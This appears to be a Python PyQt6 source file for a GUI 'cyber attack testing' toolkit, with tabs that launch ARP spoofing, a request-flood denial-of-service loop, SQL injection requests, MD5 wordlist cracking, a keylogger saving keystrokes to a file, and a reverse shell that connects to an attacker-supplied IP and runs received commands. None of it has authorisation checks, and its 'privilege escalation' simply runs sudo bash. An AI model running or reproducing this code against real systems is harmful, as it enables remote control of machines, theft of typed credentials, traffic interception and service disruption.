import sys
import subprocess
import threading
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QLabel, QPushButton, QTextEdit, QMessageBox, QLineEdit
)
from PyQt6.QtGui import QIcon, QFont
from PyQt6.QtCore import Qt
from scapy.all import ARP, send, getmacbyip
import requests
import hashlib
from pynput.keyboard import Listener
import logging
import socket

class CyberAttackTesting(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Cyber Attack Testing Software")
        self.setWindowIcon(QIcon("icon.png"))
        self.resize(900, 650)
        self.setStyleSheet("background-color: #121212; color: white;")

        # Thread control flags
        self.ddos_running = False
        self.keylogger_running = False
        self.reverse_shell_running = False

        # Main Tab Widget
        tabs = QTabWidget()
        tabs.addTab(self.create_network_attacks_tab(), "🌐 Network Attacks")
        tabs.addTab(self.create_web_exploits_tab(), "🌍 Web Exploits")
        tabs.addTab(self.create_password_cracking_tab(), "🔑 Password Cracking")
        tabs.addTab(self.create_malware_tab(), "💀 Malware")
        tabs.addTab(self.create_reverse_shell_tab(), "🔌 Reverse Shells")
        tabs.addTab(self.create_system_exploits_tab(), "⚠ System Exploits")
        tabs.addTab(self.create_logs_tab(), "📜 Logs & Reports")

        self.setCentralWidget(tabs)

    def create_tab_layout(self, title):
        layout = QVBoxLayout()
        heading = QLabel(title)
        heading.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        heading.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(heading)
        return layout

    def create_network_attacks_tab(self):
        tab = QWidget()
        layout = self.create_tab_layout("Network Attacks")

        # ARP Spoofing
        arp_label = QLabel("ARP Spoofing")
        arp_label.setFont(QFont("Arial", 12))
        layout.addWidget(arp_label)

        self.target_ip_input = QLineEdit()
        self.target_ip_input.setPlaceholderText("Enter Target IP")
        layout.addWidget(self.target_ip_input)

        self.spoof_ip_input = QLineEdit()
        self.spoof_ip_input.setPlaceholderText("Enter Spoof IP")
        layout.addWidget(self.spoof_ip_input)

        arp_button = QPushButton("Start ARP Spoofing")
        arp_button.setStyleSheet("background-color: red; padding: 10px; font-size: 14px;")
        arp_button.clicked.connect(self.start_arp_spoofing)
        layout.addWidget(arp_button)

        # DDoS Attack
        ddos_label = QLabel("DDoS Attack")
        ddos_label.setFont(QFont("Arial", 12))
        layout.addWidget(ddos_label)

        self.ddos_target_input = QLineEdit()
        self.ddos_target_input.setPlaceholderText("Enter Target URL/IP")
        layout.addWidget(self.ddos_target_input)

        self.ddos_button = QPushButton("Start DDoS Attack")
        self.ddos_button.setStyleSheet("background-color: darkred; padding: 10px; font-size: 14px;")
        self.ddos_button.clicked.connect(self.start_ddos_attack)
        layout.addWidget(self.ddos_button)

        self.stop_ddos_button = QPushButton("Stop DDoS Attack")
        self.stop_ddos_button.setStyleSheet("background-color: gray; padding: 10px; font-size: 14px;")
        self.stop_ddos_button.clicked.connect(self.stop_ddos_attack)
        self.stop_ddos_button.setEnabled(False)  # Disabled by default
        layout.addWidget(self.stop_ddos_button)

        tab.setLayout(layout)
        return tab

    def create_web_exploits_tab(self):
        tab = QWidget()
        layout = self.create_tab_layout("Web Exploits")

        # SQL Injection
        sql_label = QLabel("SQL Injection")
        sql_label.setFont(QFont("Arial", 12))
        layout.addWidget(sql_label)

        self.sql_url_input = QLineEdit()
        self.sql_url_input.setPlaceholderText("Enter Target URL")
        layout.addWidget(self.sql_url_input)

        self.sql_payload_input = QLineEdit()
        self.sql_payload_input.setPlaceholderText("Enter SQL Payload")
        layout.addWidget(self.sql_payload_input)

        sql_button = QPushButton("Run SQL Injection")
        sql_button.setStyleSheet("background-color: purple; padding: 10px; font-size: 14px;")
        sql_button.clicked.connect(self.run_sql_injection)
        layout.addWidget(sql_button)

        tab.setLayout(layout)
        return tab

    def create_password_cracking_tab(self):
        tab = QWidget()
        layout = self.create_tab_layout("Password Cracking")

        # Brute Force Attack
        brute_label = QLabel("Brute Force Attack")
        brute_label.setFont(QFont("Arial", 12))
        layout.addWidget(brute_label)

        self.hash_input = QLineEdit()
        self.hash_input.setPlaceholderText("Enter Target Hash")
        layout.addWidget(self.hash_input)

        self.wordlist_input = QLineEdit()
        self.wordlist_input.setPlaceholderText("Enter Wordlist Path")
        layout.addWidget(self.wordlist_input)

        brute_button = QPushButton("Start Brute Force Attack")
        brute_button.setStyleSheet("background-color: orange; padding: 10px; font-size: 14px;")
        brute_button.clicked.connect(self.start_brute_force)
        layout.addWidget(brute_button)

        tab.setLayout(layout)
        return tab

    def create_malware_tab(self):
        tab = QWidget()
        layout = self.create_tab_layout("Malware Simulation")

        # Keylogger
        self.malware_button = QPushButton("Start Keylogger")
        self.malware_button.setStyleSheet("background-color: darkred; padding: 10px; font-size: 14px;")
        self.malware_button.clicked.connect(self.start_keylogger)
        layout.addWidget(self.malware_button)

        self.stop_malware_button = QPushButton("Stop Keylogger")
        self.stop_malware_button.setStyleSheet("background-color: gray; padding: 10px; font-size: 14px;")
        self.stop_malware_button.clicked.connect(self.stop_keylogger)
        self.stop_malware_button.setEnabled(False)  # Disabled by default
        layout.addWidget(self.stop_malware_button)

        tab.setLayout(layout)
        return tab

    def create_reverse_shell_tab(self):
        tab = QWidget()
        layout = self.create_tab_layout("Reverse Shells")

        # Reverse Shell
        shell_label = QLabel("Reverse Shell")
        shell_label.setFont(QFont("Arial", 12))
        layout.addWidget(shell_label)

        self.shell_ip_input = QLineEdit()
        self.shell_ip_input.setPlaceholderText("Enter Attacker IP")
        layout.addWidget(self.shell_ip_input)

        self.shell_port_input = QLineEdit()
        self.shell_port_input.setPlaceholderText("Enter Attacker Port")
        layout.addWidget(self.shell_port_input)

        self.shell_button = QPushButton("Start Reverse Shell")
        self.shell_button.setStyleSheet("background-color: navy; padding: 10px; font-size: 14px;")
        self.shell_button.clicked.connect(self.start_reverse_shell)
        layout.addWidget(self.shell_button)

        self.stop_shell_button = QPushButton("Stop Reverse Shell")
        self.stop_shell_button.setStyleSheet("background-color: gray; padding: 10px; font-size: 14px;")
        self.stop_shell_button.clicked.connect(self.stop_reverse_shell)
        self.stop_shell_button.setEnabled(False)  # Disabled by default
        layout.addWidget(self.stop_shell_button)

        tab.setLayout(layout)
        return tab

    def create_system_exploits_tab(self):
        tab = QWidget()
        layout = self.create_tab_layout("System Exploits")

        # Privilege Escalation
        privilege_label = QLabel("Privilege Escalation")
        privilege_label.setFont(QFont("Arial", 12))
        layout.addWidget(privilege_label)

        privilege_button = QPushButton("Run Privilege Escalation")
        privilege_button.setStyleSheet("background-color: darkgreen; padding: 10px; font-size: 14px;")
        privilege_button.clicked.connect(self.run_privilege_escalation)
        layout.addWidget(privilege_button)

        tab.setLayout(layout)
        return tab

    def create_logs_tab(self):
        tab = QWidget()
        layout = self.create_tab_layout("Logs & Reports")

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setStyleSheet("background-color: #222; color: white; padding: 10px;")
        self.log_area.setText("[Logs will be displayed here]")
        layout.addWidget(self.log_area)

        tab.setLayout(layout)
        return tab

    def log_message(self, message):
        self.log_area.append(message)

    def start_arp_spoofing(self):
        target_ip = self.target_ip_input.text()
        spoof_ip = self.spoof_ip_input.text()
        if not target_ip or not spoof_ip:
            QMessageBox.warning(self, "Error", "Please enter both target and spoof IPs.")
            return

        self.log_message(f"Starting ARP Spoofing: Target={target_ip}, Spoof={spoof_ip}")
        try:
            arp_spoof(target_ip, spoof_ip)
            self.log_message("ARP Spoofing successful!")
        except Exception as e:
            self.log_message(f"ARP Spoofing failed: {str(e)}")

    def start_ddos_attack(self):
        target = self.ddos_target_input.text()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter a target URL/IP.")
            return

        self.ddos_running = True
        self.ddos_button.setEnabled(False)
        self.stop_ddos_button.setEnabled(True)
        self.log_message(f"Starting DDoS Attack on {target}")
        threading.Thread(target=self.ddos_attack, args=(target,)).start()

    def stop_ddos_attack(self):
        self.ddos_running = False
        self.ddos_button.setEnabled(True)
        self.stop_ddos_button.setEnabled(False)
        self.log_message("DDoS Attack stopped.")

    def ddos_attack(self, target):
        try:
            while self.ddos_running:
                requests.get(target)
                self.log_message(f"Sent request to {target}")
        except Exception as e:
            self.log_message(f"DDoS Attack failed: {str(e)}")

    def run_sql_injection(self):
        url = self.sql_url_input.text()
        payload = self.sql_payload_input.text()
        if not url or not payload:
            QMessageBox.warning(self, "Error", "Please enter both URL and payload.")
            return

        self.log_message(f"Running SQL Injection: URL={url}, Payload={payload}")
        try:
            result = sql_injection(url, payload)
            self.log_message(f"SQL Injection result: {result}")
        except Exception as e:
            self.log_message(f"SQL Injection failed: {str(e)}")

    def start_brute_force(self):
        target_hash = self.hash_input.text()
        wordlist_path = self.wordlist_input.text()
        if not target_hash or not wordlist_path:
            QMessageBox.warning(self, "Error", "Please enter both target hash and wordlist path.")
            return

        self.log_message(f"Starting Brute Force Attack: Hash={target_hash}, Wordlist={wordlist_path}")
        try:
            result = crack_hash(target_hash, wordlist_path)
            if result:
                self.log_message(f"Password found: {result}")
            else:
                self.log_message("Password not found.")
        except Exception as e:
            self.log_message(f"Brute Force Attack failed: {str(e)}")

    def start_keylogger(self):
        self.keylogger_running = True
        self.malware_button.setEnabled(False)
        self.stop_malware_button.setEnabled(True)
        self.log_message("Starting Keylogger...")
        threading.Thread(target=self.keylogger).start()

    def stop_keylogger(self):
        self.keylogger_running = False
        self.malware_button.setEnabled(True)
        self.stop_malware_button.setEnabled(False)
        self.log_message("Keylogger stopped.")

    def keylogger(self):
        logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

        def on_press(key):
            if not self.keylogger_running:
                return False  # Stop listener
            logging.info(str(key))

        with Listener(on_press=on_press) as listener:
            listener.join()

    def start_reverse_shell(self):
        ip = self.shell_ip_input.text()
        port = self.shell_port_input.text()
        if not ip or not port:
            QMessageBox.warning(self, "Error", "Please enter both IP and port.")
            return

        self.reverse_shell_running = True
        self.shell_button.setEnabled(False)
        self.stop_shell_button.setEnabled(True)
        self.log_message(f"Starting Reverse Shell: IP={ip}, Port={port}")
        threading.Thread(target=self.reverse_shell, args=(ip, int(port))).start()

    def stop_reverse_shell(self):
        self.reverse_shell_running = False
        self.shell_button.setEnabled(True)
        self.stop_shell_button.setEnabled(False)
        self.log_message("Reverse Shell stopped.")

    def reverse_shell(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            while self.reverse_shell_running:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    break
                output = subprocess.getoutput(command)
                s.send(output.encode())
            s.close()
        except Exception as e:
            self.log_message(f"Reverse Shell failed: {str(e)}")

    def run_privilege_escalation(self):
        self.log_message("Running Privilege Escalation...")
        try:
            subprocess.run(["sudo", "bash"], check=True)
            self.log_message("Privilege Escalation successful!")
        except Exception as e:
            self.log_message(f"Privilege Escalation failed: {str(e)}")

# Attack Functions
def arp_spoof(target_ip, spoof_ip):
    target_mac = getmacbyip(target_ip)
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_packet, verbose=False)

def sql_injection(url, payload):
    response = requests.get(url, params={"id": payload})
    return response.text

def crack_hash(target_hash, wordlist):
    with open(wordlist, "r") as file:
        for word in file:
            word = word.strip()
            hashed_word = hashlib.md5(word.encode()).hexdigest()
            if hashed_word == target_hash:
                return word
    return None

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    window = CyberAttackTesting()
    window.show()
    sys.exit(app.exec())
